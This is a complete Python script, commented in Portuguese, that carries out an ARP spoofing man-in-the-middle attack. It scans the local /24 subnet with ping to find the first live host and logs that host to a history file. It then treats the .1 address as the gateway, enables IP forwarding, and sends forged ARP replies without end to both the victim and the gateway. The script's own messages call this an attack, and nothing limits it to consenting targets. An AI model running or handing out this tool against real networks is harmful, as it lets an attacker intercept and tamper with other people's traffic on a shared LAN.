import os
import socket
import struct
import threading
from time import sleep, strftime
from datetime import datetime


def get_local_ip():
    """Obtém o IP local automaticamente."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))  # Conexão fictícia para determinar o IP local
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip


def get_mac(interface):
    """Obtém o endereço MAC da interface de rede."""
    try:
        with open(f'/sys/class/net/{interface}/address') as f:
            return f.read().strip()
    except FileNotFoundError:
        print(f"[!] Interface {interface} não encontrada.")
        return None


def log_to_history(file_path, ip):
    """Registra o IP encontrado no arquivo de histórico."""
    with open(file_path, "a") as history_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        history_file.write(f"{timestamp} - IP encontrado: {ip}\n")
        print(f"[+] Registrado no histórico: {ip}")


def discover_first_host(local_ip, history_file):
    """Procura o primeiro IP ativo na sub-rede do IP local."""
    subnet = ".".join(local_ip.split(".")[:3])  # Determina a sub-rede (ex.: 192.168.1)
    print(f"[*] Varredura na sub-rede: {subnet}.0/24")
    for i in range(1, 255):  # Varre todos os IPs da sub-rede
        target_ip = f"{subnet}.{i}"
        if target_ip == local_ip:
            continue  # Ignora o IP local
        if is_host_alive(target_ip):
            log_to_history(history_file, target_ip)  # Atualiza o histórico
            print(f"[+] Primeiro host ativo encontrado: {target_ip}")
            return target_ip
    print("[!] Nenhum host ativo encontrado.")
    return None


def is_host_alive(ip):
    """Verifica se um host está ativo enviando um pacote ICMP (ping)."""
    try:
        response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        return response == 0
    except Exception:
        return False


def build_arp_packet(op, src_mac, src_ip, target_mac, target_ip):
    """Constrói um pacote ARP em formato binário."""
    broadcast_mac = b'\xff\xff\xff\xff\xff\xff' if target_mac is None else bytes.fromhex(target_mac.replace(':', ''))
    eth_header = struct.pack("!6s6sH", broadcast_mac, bytes.fromhex(src_mac.replace(':', '')), 0x0806)
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        1,  # Hardware type (Ethernet)
        0x0800,  # Protocol type (IPv4)
        6,  # Hardware size (MAC size)
        4,  # Protocol size (IPv4 size)
        op,  # Operation (1=Request, 2=Reply)
        bytes.fromhex(src_mac.replace(':', '')),  # Sender MAC address
        socket.inet_aton(src_ip),  # Sender IP address
        broadcast_mac,  # Target MAC address
        socket.inet_aton(target_ip)  # Target IP address
    )
    return eth_header + arp_header


def send_arp_reply(interface, src_mac, src_ip, target_mac, target_ip):
    """Envia pacotes ARP para o alvo."""
    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    raw_socket.bind((interface, 0))
    arp_packet = build_arp_packet(2, src_mac, src_ip, target_mac, target_ip)
    while True:
        raw_socket.send(arp_packet)
        sleep(1)  # Evita congestionamento com envio constante


def enable_ip_forwarding():
    """Habilita o encaminhamento de pacotes no Linux."""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forwarding():
    """Desabilita o encaminhamento de pacotes no Linux."""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def main():
    # Configurações
    history_file = "historico_ips.txt"

    # Detecta informações locais
    interface = os.listdir('/sys/class/net/')[0]  # Pega a primeira interface disponível
    local_ip = get_local_ip()
    local_mac = get_mac(interface)

    if not local_mac:
        print("[!] Não foi possível obter o endereço MAC local.")
        return

    print(f"[+] Interface de rede detectada: {interface}")
    print(f"[+] IP local detectado: {local_ip}")
    print(f"[+] MAC local detectado: {local_mac}")

    # Varredura para encontrar o primeiro host ativo
    target_ip = discover_first_host(local_ip, history_file)
    if not target_ip:
        print("[!] Nenhum host ativo encontrado para atacar.")
        return

    # Determina o IP do gateway (assumindo o .1 da sub-rede como gateway)
    gateway_ip = ".".join(local_ip.split(".")[:3]) + ".1"

    print(f"[+] Gateway detectado: {gateway_ip}")

    # Inicia ataque ARP Spoofing
    print("[*] Habilitando IP forwarding...")
    enable_ip_forwarding()

    print("[*] Iniciando ataque ARP Spoofing...")
    try:
        # Thread para enviar pacotes ARP para o alvo
        threading.Thread(target=send_arp_reply, args=(interface, local_mac, gateway_ip, None, target_ip)).start()

        # Thread para enviar pacotes ARP para o gateway
        threading.Thread(target=send_arp_reply, args=(interface, local_mac, target_ip, None, gateway_ip)).start()

        # Mantém o programa rodando
        while True:
            sleep(1)
    except KeyboardInterrupt:
        print("[!] Interrompendo ataque...")
    finally:
        print("[*] Restaurando configurações...")
        disable_ip_forwarding()


if __name__ == "__main__":
    main()
